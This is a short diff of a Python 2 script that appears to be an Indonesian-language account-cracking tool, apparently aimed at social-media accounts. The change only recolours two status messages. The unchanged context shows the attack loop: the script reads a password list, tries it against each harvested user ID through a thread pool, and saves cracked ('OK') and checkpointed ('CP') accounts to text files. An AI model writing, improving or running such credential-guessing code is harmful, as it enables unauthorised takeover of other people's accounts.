@@ -826,8 +826,8 @@ def dekura_x():
 				asu = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Pass List: ").split(",")
 				if len(asu) =="":
 					exit("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] jangan kosong")
-				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : ok.txt"
-				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : cp.txt'
+				print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;35m] Account [OK] saved to : ok.txt"
+				print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;33m] Account [CP] saved to : cp.txt'
 				for user in id:
 					uid, name = user.split("<=>")
 					coeg.submit(api, uid, asu)
